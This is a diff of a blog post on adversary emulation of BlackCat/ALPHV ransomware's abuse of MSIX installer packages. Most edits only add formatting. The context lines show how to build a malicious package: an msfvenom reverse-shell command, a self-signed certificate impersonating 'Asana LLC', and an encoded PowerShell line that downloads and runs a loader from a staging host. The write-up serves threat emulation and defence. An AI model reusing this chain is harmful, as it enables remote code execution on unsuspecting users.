@@ -48,7 +48,7 @@ tags:
 
 - I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
 <br>
-- In this article, we will go over the .msix file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.
+- In this article, we will go over the `.msix` file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.
 
 ## The MSIX File Format
 
@@ -74,7 +74,7 @@ tags:
 
 ## Package Support Framework
 
-- The Package Support Framework (PSF), is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.
+- The `Package Support Framework (PSF)`, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.
 
 - It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.
 
@@ -91,8 +91,8 @@ tags:
 
 ### StartingScriptWrapper.ps1
 
-- PSF can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run. 
-- To perform this, a configuration item called the StartingScriptWrapper can be defined to tell PSF to run a script after the packaged application finishes installing.
+- `PSF` can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run. 
+- To perform this, a configuration item called the `StartingScriptWrapper` can be defined to tell PSF to run a script after the packaged application finishes installing.
 - We can use this to run scripts to stage our implants for Initial Access
 
 ## Analysis of a malicious sample
@@ -122,13 +122,13 @@ sample </a> from malwarebazaar.
 <img src="/posts/2024-06-11_asd/images/appxmanifest.png"> 
 </div>
 
-- The properties contains details identifying the application such as the name, description and the logo that the app uses.
-- In the applications section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
-- The Capabilities section is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the `runFullTrust` capability.
+- The `properties` section contains details identifying the application such as the name, description and the logo that the app uses.
+- In the `applications` section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
+- The `Capabilities section` is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the `runFullTrust` capability.
 
 ### Config.json
 
-- This is where things start to get interesting!
+- This is where things start to get interesting. We can see the various parameters being used in the configuration
 
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/configfile.png"> 
@@ -136,14 +136,14 @@ sample </a> from malwarebazaar.
 
 
 1. The PSF executable will be launched.
-2. scriptExecutionMode has been set to RemoteSigned, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
-3. The start script section defines usJzY.ps1 as the script that will be executed at the start.
-4. showWindow has been set to false, meaning the powershell script will run in the background without invoking the command window.
+2. `scriptExecutionMode` has been set to `RemoteSigned`, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
+3. The `start script` section defines `usJzY.ps1` as the script that will be executed at the start.
+4. `showWindow`  has been set to `false`, meaning the powershell script will run in the background without invoking the command window.
 
 
 ### StartingScriptWrapper
 
-- The StartingScriptWrapper is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.
+- The `StartingScriptWrapper` is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.
 
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/startingsciptwrapper.png"> 
@@ -172,7 +172,7 @@ sample </a> from malwarebazaar.
 
 ### 1. Setting up the MSIX packaging tool and our setup file
 
-- First, you will need to install the MSIX packaging tool from the Microsoft Store
+- First, you will need to install the `MSIX packaging tool` from the Microsoft Store
 
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
@@ -207,10 +207,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 
 
 ### 3. Create an SSL certificate
 
-- When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
-- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self-signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
+- When running the MSIX file, Windows will check for the `digital signature` of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
+- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own `self-signed certificate`, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
 
-1. Create a new self signed certificate
+1. Create a new self-signed certificate
 
 ```powershell
 New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Asana LLC" -FriendlyName "Asana LLC"
@@ -309,7 +309,7 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 }
 
 ```
-- Create the hotfix.ps1 file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it
+- Create the `hotfix.ps1` file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it
 
 <img src="/posts/2024-06-11_asd/images/cyberchef.png" width=1000px;>
 
@@ -317,7 +317,7 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
 ```
 
-- Add the hotfix.ps1 staging script
+- Add the `hotfix.ps1` staging script
 
 <img src="/posts/2024-06-11_asd/images/hotfix.png" width=1000px;>
 
@@ -337,7 +337,10 @@ powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADE
 
 ## Testing our malicious sample
 
-- *****  Ensure that the Asana application is not installed in the system
+{{< alert >}}
+Ensure that the Asana application is not installed in the system
+{{< /alert >}}
+
 
 <img src="/posts/2024-06-11_asd/images/asanainstaller2.png">
 
